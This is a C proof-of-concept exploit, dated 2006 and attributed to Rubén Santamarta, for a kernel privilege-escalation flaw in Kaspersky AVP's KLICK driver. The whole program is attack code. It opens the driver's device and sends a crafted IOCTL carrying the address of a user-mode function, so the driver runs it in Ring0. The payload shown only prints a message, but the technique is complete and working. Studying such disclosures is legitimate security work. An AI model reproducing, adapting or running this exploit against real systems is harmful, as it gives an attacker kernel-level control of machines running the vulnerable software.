////////////////////////////////////
///// AVP (Kaspersky) 
////////////////////////////////////
//// FOR EDUCATIONAL PURPOSES ONLY
//// Kernel Privilege Escalation #2
//// Exploit
//// Rubén Santamarta 
//// www.reversemode.com
//// 01/09/2006
////
////////////////////////////////////



#include <windows.h>
#include <stdio.h>



void Ring0Function()
{
     printf("----[RING0]----\n");
     printf("Hello From Ring0!\n");
     printf("----[RING0]----\n\n");
     exit(1);
}

VOID ShowError()
{
 LPVOID lpMsgBuf;
 FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER| FORMAT_MESSAGE_FROM_SYSTEM,
               NULL,
               GetLastError(),
               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
               (LPTSTR) &lpMsgBuf,
               0,
               NULL);
 MessageBoxA(0,(LPTSTR)lpMsgBuf,"Error",0);
 exit(1);
}

int main(int argc, char *argv[])
{

 DWORD				InBuff[1];			
 DWORD				dwIOCTL,OutSize,InSize,junk;
 HANDLE				hDevice;


system("cls");
printf("#######################\n");
printf("## AVP Ring0 Exploit ##\n");
printf("#######################\n");
printf("Ruben Santamarta\nwww.reversemode.com\n\n");

hDevice = CreateFile("\\\\.\\KLICK",
                     0,
                     0,
                     NULL,
                     3,
                     0,
                     0);

//////////////////////
///// INFO 
//////////////////////

 if (hDevice == INVALID_HANDLE_VALUE) ShowError();
 printf("[!] KLICK Device Handle [%x]\n",hDevice);
 
//////////////////////
///// BUFFERS
//////////////////////
 InSize = 0x8;

 
 InBuff[0] =(DWORD) Ring0Function;  // Ring0 ShellCode Address
 
 //////////////////////
 ///// IOCTL
 //////////////////////

 dwIOCTL = 0x80052110;

 printf("[!] IOCTL [0x%x]\n\n",dwIOCTL);
 
 DeviceIoControl(hDevice, 
                 dwIOCTL, 
                 InBuff,0x8,
                 (LPVOID)NULL,0,
                 &junk,  
                 NULL);
 
 
}
